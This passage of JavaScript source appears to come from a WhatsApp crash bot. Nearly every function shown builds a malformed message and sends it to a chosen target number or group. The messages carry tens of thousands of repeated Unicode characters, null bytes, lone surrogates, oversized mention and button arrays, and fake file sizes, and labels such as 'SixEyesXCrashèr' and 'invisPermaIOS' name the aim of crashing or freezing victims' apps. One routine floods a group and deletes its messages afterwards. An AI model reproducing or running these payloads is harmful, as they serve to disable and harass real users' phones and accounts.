        }
      }
    ]
  });
  
  console.log(`Catalog bug sent to ${groupJid} - done`);
}

async function iosQsx(sock, target) {
  let msg = generateWAMessageFromContent(target,
    {
      contactMessage: {
        displayName:
          "🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔" + "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘃𝗮͢𝘂̷𝗹⃨𝘁̷͢-𝘀͢𝘂𝗽𝗲𝗿̷͢𝗶𝗼𝗿 ⿻ \"im the man who cant be moved\" ✶ > #𝟔⩇𝟔${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function neneklo(sock, target) {
    await sock.sendMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(50000) + "\uD800".repeat(20000) + "\u0000".repeat(50000),
            publisher: "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(30000) + "\u200B".repeat(40000),
            stickers: [],
            fileLength: "9999999999999999999",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () => "0@s.whatsapp.net"),
                isForwarded: true,
                forwardingScore: 999999999,
                quotedMessage: {
                    interactiveMessage: {
                        body: { 
                            text: "\uD800".repeat(20000) 
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "- # SixEyesXCrashèr ん.? " + "ꦾ".repeat(20000),
                                    sections: [{ 
                                        title: " ", 
                                        rows: [] 
                                    }]
                                })
                            }]
                        }
                    }
                }
            },
            mediaKeyTimestamp: "1747502082",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            stickerPackOrigin: "USER_CREATED"
        }
    });
}

async function PayX(sock, target) {
await sock.relayMessage(target, {
  interactiveMessage: {
   body: { text: "- # SixEyesXCrashèr ん.? " },
    nativeFlowMessage: {
     buttons: [
       {
         name: "review_and_pay",
         buttonParamsJson: `{"reference_id":"${"𑇂".repeat(50000)}","currency":"IDR","total_amount":{"value":150000,"offset":100},"order":{"status":"pending","subtotal":{"value":120000,"offset":100},"tax":{"value":30000,"offset":100},"items":[{"name":"${"\0".repeat(9000)}","amount":{"value":12000000,"offset":100},"quantity":1000}]}}`
       }
     ], 
      messageParamsJson: JSON.stringify({
       limited_time_offer: {
        text: "kontol",
        url: "https://t.me/xeternalz_info",
        copy_code: "- # SixEyesXCrashèr ん.? ",
        expiration_time: Date.now() * 10000
        },
        tap_target_configuration: {
         title: "- # SixEyesXCrashèr ん.? ",
         description: "- # SixEyesXCrashèr ん.? ",
         canonical_url: "https://t.me/xeternalz_info",
         domain: "https://t.me/xeternalz_info",
         button_index: 0
        },
      })
    }
  }
}, {
   participant: true
})
}

async function PayXGroup(sock, target) {
await sock.relayMessage(target, {
  interactiveMessage: {
   body: { text: "- # SixEyesXCrashèr ん.? " },
    nativeFlowMessage: {
     buttons: [
       {
         name: "review_and_pay",
         buttonParamsJson: `{"reference_id":"${"𑇂".repeat(50000)}","currency":"IDR","total_amount":{"value":150000,"offset":100},"order":{"status":"pending","subtotal":{"value":120000,"offset":100},"tax":{"value":30000,"offset":100},"items":[{"name":"${"\0".repeat(9000)}","amount":{"value":12000000,"offset":100},"quantity":1000}]}}`
       }
     ], 
      messageParamsJson: JSON.stringify({
       limited_time_offer: {
        text: "kontol",
        url: "https://t.me/xeternalz_info",
        copy_code: "- # SixEyesXCrashèr ん.? ",
        expiration_time: Date.now() * 10000
        },
        tap_target_configuration: {
         title: "- # SixEyesXCrashèr ん.? ",
         description: "- # SixEyesXCrashèr ん.? ",
         canonical_url: "https://t.me/xeternalz_info",
         domain: "https://t.me/xeternalz_info",
         button_index: 0
        },
      })
    }
  }
}, {
   participant: false
})
}

async function PahinaApple(sock, jid) {
  try {
    const msg = generateWAMessageFromContent(jid, {
      locationMessage: {
        name: "- # SixEyesXCrashèr ん.? " + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
        address: "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
      }
    }, {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id, statusJidList: [jid], additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: jid }, content: undefined
          }]
        }]
      }]
    });
  } catch (error) {
    console.log("error kontol: ", error);
  }
}

async function invisPermaIOS(sock, target) {
  await sock.relayMessage("status@broadcast", {
  "contactMessage": {
    "displayName": "  — Zephyrinē Lagii Sedihh  " + "𑇂𑆵𑆴𑆿".repeat(10000),
    "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;🌺${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🌺${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:  — Zephyrinē Lagii Sedihh  ${"ᩫᩫ".repeat(4000)}\nORG:🌺${"ᩫᩫ".repeat(4000)}\nTITLE:  — Zephyrinē Lagii Sedihh  ${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🌺${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🌺${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🌺${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🌺${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🌺${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:  — Zephyrinē Lagii Sedihh  ${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
  "contextInfo": {
     "participant": "status@broadcast",
        "externalAdReply": {
           "automatedGreetingMessageShown": true,
           "automatedGreetingMessageCtaType": "\u0000".repeat(100000),
           "greetingMessageBody": "\u0000"
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {
        status_setting: "allowlist"
      },
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: {
                jid: target
              }
            }
          ]
        }
      ]
    }]
  })
}

async function Blackhp(sock, target) {
  await sock.sendMessage(target, {
    interactiveMessage: {
      header: {
        title: "ြ".repeat(25000),
        subtitle: "ြ".repeat(25000),
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: -6.2,
          degreesLongitude: 106.816666,
          name: v1(603),
          address: v1(774),
          jpegThumbnail: null
        }
      },
      body: {
        text: v1(774)
      },
      contextInfo: {
        quotedMessage: {
          interactiveMessage: {
            body: {},
            nativeFlowMessage: {
              buttons: Array.from({
                length: 30000
              }, () => ({}))
            }
          }
        },
        externalAdReply: {
          title: "\0".repeat(10000),
          body: v1(774),
          mediaType: 1,
          thumbnailUrl: v1(692),
          sourceUrl: v1(1159),
          renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: v1(955),
          serverMessageId: 143,
          newsletterName: v1(864)
        },
        mentionedJid: Array.from({
          length: 1999
        }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
        isForwarded: true,
        statusAttributionType: 4,
        statusAttributions: Array.from({
          length: 5000
        }, () => ({
          type: 1
        }))
      },
      nativeFlowMessage: {
        buttons: [{
          name: "cta_call",
          buttonParamsJson: JSON.stringify({
            display_text: "ꦽꦾ".repeat(20000),
            phone_number: v1(774)
          })
        }]
      }
    }
  }, {});
  await sock.sendMessage(target, {
    interactiveMessage: {
      header: {
        title: "ြ".repeat(25000),
        subtitle: "ြ".repeat(25000)
      },
      body: {
        text: "\0".repeat(1000)
      },
      contextInfo: {
        quotedMessage: {
          conversation: null
        },
        externalAdReply: {
          title: "\0".repeat(15000),
          body: v1(774),
          mediaType: 1,
          thumbnailUrl: v1(692),
          sourceUrl: v1(1159),
          renderLargerThumbnail: true
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: v1(955),
          serverMessageId: 143,
          newsletterName: v1(864)
        },
        mentionedJid: Array.from({
          length: 1999
        }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
        isForwarded: true,
        statusAttributionType: 4,
        statusAttributions: Array.from({
          length: 5000
        }, () => ({
          type: 1
        }))
      },
      nativeFlowMessage: {
        buttons: Array.from({
          length: 300000
        }, () => ({}))
      }
    }
  }, {});
}

async function SennUiOverload(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(120000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "霊 (20.) Phrase: ”ʏǟռʐʐ քɦʏʀɨռē.“" + "ꦾ".repeat(120000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function SennCursedBlank(target) {
  let buttonpush = [
    { name: "single_select",     buttonParamsJson: "" }
  ];
  
  for (let r = 0; r < 25; r++) {
    buttonpush.push(
      { name: "galaxy_message",     buttonParamsJson: JSON.stringify({ icon: "DOCUMENT",flow_cta: "ꦾ".repeat(120000),flow_message_version: "3" }) }
    );
  }
  
  let msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "霊 (20.) Phrase: ”ʏǟռʐʐ քɦʏʀɨռē.“",
              locationMessage: {
                degreesLatitude: 1e15,
                degreesLongtitude: 1e15,
                name: "霊 (20.) Phrase: ”ʏǟռʐʐ քɦʏʀɨռē.“",
                address: "霊 (20.) Phrase: ”ʏǟռʐʐ քɦʏʀɨռē.“",
              },
              hasMediaAttachment: false,
            },
            body: {
              text: "\n",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: buttonpush,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              }
            }
          }
        }
      }
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
}

async function DelayGroupNew(sock, target) {
  for(let z = 0; z < 75; z++) {
    let ZxY = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`), 
          isForwarded: true, 
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363424020283759@newsletter", 
            newsletterName: "霊 (20.) Phrase: ”ʏǟռʐʐ քɦʏʀɨռē.“", 
            serverMessageId: 1000,
            accessibilityText: "霊 (20.) Phrase: ”ʏǟռʐʐ քɦʏʀɨռē.“"
          }, 
          statusAttributionType: "RESHARED_FROM_MENTION", 
          contactVcard: true, 
          isSampled: true, 
          dissapearingMode: {
            initiator: target, 
            initiatedByMe: true
          }, 
          expiration: Date.now()
        }, 
        body: {
          text: "霊 (20.) Phrase: ”ʏǟռʐʐ քɦʏʀɨռē.“",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"JustinOfficial\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    };
    
    let msg = generateWAMessageFromContent(target, {
      groupStatusMessageV2: {
        message: ZxY
      }
    }, {});
  
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });
    await sleep(1000);
    await sock.sendMessage(target, {
      delete: msg.key
    }) 
  }
}

async function XeonFcbisnis(sock, target) {
    const orderItem = {
        name: "- # SixEyesXCrashèr ん.",
        amount: {
            value: 0,
            offset: 100
        },
        quantity: 9999
    };

    const message = {
        interactiveMessage: {
            header: {
                title: "0",
                subtitle: "0",
                hasMediaAttachment: true
            },
            body: {
                text: "- # SixEyesXCrashèr ん."
            },
            footer: {
                text: "- # SixEyesXCrashèr ん."
            },
            contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                externalAdReply: {
                    title: "- # SixEyesXCrashèr ん.",
                    body: "- # SixEyesXCrashèr ん.",
                    mediaType: 1
                }
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "catalog_message",
                        buttonParamsJson: "{}"
                    },
                    {
                        name: "booking_status",
                        buttonParamsJson: "{}"
                    },
                    {
                        name: "review_and_pay",
                        buttonParamsJson: JSON.stringify({
                            currency: "IDR",
                            total_amount: {
                                value: 0,
                                offset: 100
                            },
                            reference_id: "x",
                            type: "physical-goods",
                            order: {
                                status: "payment_requested",
                                subtotal: {
                                    value: 0,
                                    offset: 100
                                },
                                order_type: "ORDER",
                                items: [orderItem]
                            }
                        })
                    }
                ],
                messageParamsJson: "{}"
            }
        }
    };

    await sock.relayMessage(target, message, {
        participant: target,
        additionalNodes: [
            {
                tag: "biz",
                attrs: {
                    native_flow_name: "catalog_message"
                }
            }
        ]
    });
}

async function spamVideo(sock, target) {
    const videoUrls = [
